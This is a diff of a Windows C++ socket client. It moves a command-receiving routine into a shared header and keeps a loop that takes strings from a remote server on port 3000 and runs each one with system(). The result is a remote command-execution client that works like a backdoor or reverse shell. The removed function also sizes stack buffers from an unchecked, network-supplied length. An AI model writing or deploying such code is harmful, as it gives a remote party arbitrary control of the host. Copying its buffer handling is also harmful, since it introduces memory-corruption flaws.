@@ -9,6 +9,8 @@
 #include <iostream>
 #include <string>
 
+#include "common_funcs.h"
+
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Mswsock.lib")
@@ -16,42 +18,6 @@
 
 #define DEFAULT_BUFLEN 512
 #define DEFAULT_PORT "3000"
-
-static const int DATA_NUM_LEN = 20;
-
-std::string recieve_command(SOCKET &ConnectSocket)
-{
-    char data_len_recv_buffer[DATA_NUM_LEN];
-    int data_len;
-
-    // Receive until the peer closes the connection
-    int bytesReceived = recv(ConnectSocket, data_len_recv_buffer, DATA_NUM_LEN, 0);
-    if (bytesReceived > 0)
-    {
-        char data_len_c[bytesReceived + 1];
-        for (int i = 0; i < bytesReceived; i++) data_len_c[i] = data_len_recv_buffer[i];
-
-        data_len = atoi(data_len_c);
-        std::cout << "Receiving " << data_len << " bytes of data\n";
-
-        char command_recv_buffer[data_len];
-        bytesReceived = recv(ConnectSocket, command_recv_buffer, data_len, 0);
-
-        char command[bytesReceived + 1];
-        for (int i = 0; i < bytesReceived; i++) command[i] = command_recv_buffer[i];
-        command[bytesReceived] = '\0';
-
-        return command;
-    }
-    else if (bytesReceived == 0) {
-        printf("Connection closed\n");
-        return "NULL_COMMAND";
-    }
-    else {
-        printf("recv failed with error: %d\n", WSAGetLastError());
-        return "NULL_COMMAND";
-    }
-}
 
 int __cdecl main(int argc, char **argv)
 {
@@ -127,7 +93,7 @@ int __cdecl main(int argc, char **argv)
     }
 
     std::string command;
-    while ((command = recieve_command(ConnectSocket)) != "NULL_COMMAND") {
+    while ((command = common::Receive(ConnectSocket)) != "") {
         std::cout << "Executing command: " << command << '\n';
         system(command.c_str());
     }
